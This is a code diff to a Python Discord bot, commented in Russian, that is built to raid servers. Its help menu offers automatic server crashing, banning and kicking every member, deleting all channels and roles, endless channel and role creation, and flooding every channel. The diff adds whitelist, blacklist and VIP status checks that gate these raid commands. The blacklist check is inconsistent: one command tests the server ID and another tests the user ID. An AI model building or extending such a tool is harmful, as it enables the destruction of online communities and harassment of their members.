@@ -23,8 +23,11 @@ class MyClient(discord.Client):
 			await message.delete()
 			embed = discord.Embed(title=":grey_question: Помощь", description="", color=0x00cc00)
 			embed.add_field(name='*атака', value='Автоматический краш сервера', inline=False)
+			embed.add_field(name='*бс', value='Проверка сервера на наличие в белом списке', inline=False)
 			embed.add_field(name='*всембан', value='Забанить всех участников', inline=False)
 			embed.add_field(name='*всемкик', value='Кикнуть всех участников', inline=False)
+			embed.add_field(name='*вип', value='Проверка VIP-статуса', inline=False)
+			embed.add_field(name='*виппомощь', value='VIP-команды', inline=False)
 			embed.add_field(name='*канал-', value='Удалить текущий канал', inline=False)
 			embed.add_field(name='*каналы-', value='Удалить все каналы', inline=False)
 			embed.add_field(name='*каналы+', value='Бесконечное создание каналов', inline=False)
@@ -33,7 +36,8 @@ class MyClient(discord.Client):
 			embed.add_field(name='*переименовать', value='Перименовать сервер', inline=False)
 			embed.add_field(name='*роли-', value='Удалить все роли', inline=False)
 			embed.add_field(name='*роли+', value='Бесконечное создание ролей', inline=False)
-			embed.add_field(name='*флуд', value='Зафлудить текущий канал', inline=False)
+			embed.add_field(name='*флуд', value='Зафлудить все каналы', inline=False)
+			embed.add_field(name='*чс', value='Проверка вас на наличие в чёрном списке', inline=False)
 			await message.author.send(embed=embed)
 			
 		if message.content == '*бс':
@@ -42,6 +46,18 @@ class MyClient(discord.Client):
 				await message.author.send(':x: Сервер не находится в белом списке.')
 			else:
 				await message.author.send(':white_check_mark: Сервер находится в белом списке.')
+		if message.content == '*чс':
+			await message.delete()
+			if black.find(str(message.guild.id)) == -1:
+				await message.author.send(':white_check_mark: Вас нет в чёрном списке.')
+			else:
+				await message.author.send(':x: Вы находитесь в чёрном списке.')
+		if message.content == '*вип':
+			await message.delete()
+			if vips.find(str(message.guild.id)) == -1:
+				await message.author.send(':x: У вас нет VIP-статуса.')
+			else:
+				await message.author.send(':white_check_mark: У вас есть VIP-статус :crown:.')
 		if white.find(str(message.guild.id)) == -1 and black.find(str(message.author.id)) == -1:
 			if message.content == '*атака': #автоматический краш
 				await message.delete() #удаление сообщения
